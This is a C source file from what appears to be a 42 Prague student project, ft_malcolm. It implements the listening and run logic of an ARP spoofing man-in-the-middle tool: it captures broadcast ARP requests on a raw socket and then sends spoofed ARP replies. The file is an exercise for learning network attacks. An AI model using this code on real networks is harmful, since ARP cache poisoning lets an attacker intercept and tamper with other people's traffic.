/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   mitm.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ffarkas <ffarkas@student.42prague.com>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/10/29 21:48:56 by ffarkas           #+#    #+#             */
/*   Updated: 2024/11/01 05:05:58 by ffarkas          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../incl/ft_malcolm.h"

int	analyze_broadcast(t_malcolm *malcolm, unsigned char *buffer)
{
	struct ethhdr	*eth_header;

	eth_header = (struct ethhdr *)buffer;
	malcolm->packet = *(t_packet *)(buffer + sizeof(struct ethhdr));
	if (ntohs(malcolm->packet.header.ar_op) != 1)
		return (NON_VALID);
	dprintf(STDOUT_FILENO, "%s\nft_malcolm:%s an ARP request has been broadcast [%s]\n\n", YL, NC, fetch_time());
	if (malcolm->options.verbose)
	{
		print_eth_info(eth_header);
		print_arp_info(&malcolm->packet);
	}
	print_packet_info(&malcolm->packet, '1');
	ft_memcpy(malcolm->spoof.ip_addr, malcolm->packet.target_ip, IPv4_BINLENGTH);
	return (VALID);
}

int	listen_to_broadcast(t_malcolm *malcolm)
{
	struct sockaddr_in	recv_addr;
	socklen_t			addr_size;
	ssize_t				recv_bytes;
	unsigned char		buffer[sizeof(struct ethhdr) + sizeof(t_packet)];

	addr_size = sizeof(recv_addr);
	ft_memset(buffer, 0, sizeof(buffer));
	ft_memset(&recv_addr, 0, sizeof(recv_addr));
	dprintf(STDOUT_FILENO, "%sft_malcolm:%s intercepting broadcast...\n", GR, NC);
	while (g_sig_status)
	{
		recv_bytes = recvfrom(malcolm->spoof.socket_fd, &buffer, sizeof(buffer), 0, (struct sockaddr *)&recv_addr, &addr_size);
		if (recv_bytes == -1)
		{
			if (errno == EINTR)
				return (VALID);
			else if (errno == EAGAIN || errno == EWOULDBLOCK)
			{
				if (malcolm->options.verbose)
					dprintf(STDOUT_FILENO, "\n%s%sTIMEOUT:%s no packets received [%s]\n", PAD, BL, NC, fetch_time());
				continue ;
			}
			close(malcolm->spoof.socket_fd);
			return (print_args_error("%sft_malcolm:%s failed to receive ARP request packet\n", RD, NC));
		}
		if (ft_memcmp(buffer, BROADCAST, 6) == 0)
		{
			if (analyze_broadcast(malcolm, buffer) == NON_VALID)
				continue ;
			return (VALID);
		}
	}
	return (VALID);
}

int	mitm_run(t_malcolm *malcolm)
{
	dprintf(STDOUT_FILENO, "%sft_malcolm:%s starting...\n\n", GR, NC);
	if (malcolm->options.verbose)
		print_start(malcolm);

	if (fetch_interface(malcolm) == NON_VALID)
		return (print_args_error("%sft_malcolm:%s no matching interface found\n", RD, NC));
	
	if (setup_socket(malcolm) == NON_VALID)
		return (NON_VALID);

	if (!malcolm->options.gratuitous && listen_to_broadcast(malcolm) == NON_VALID)
		return (NON_VALID);	

	if (send_arp_reply(malcolm) == NON_VALID)
		return (NON_VALID);

	return (VALID);
}
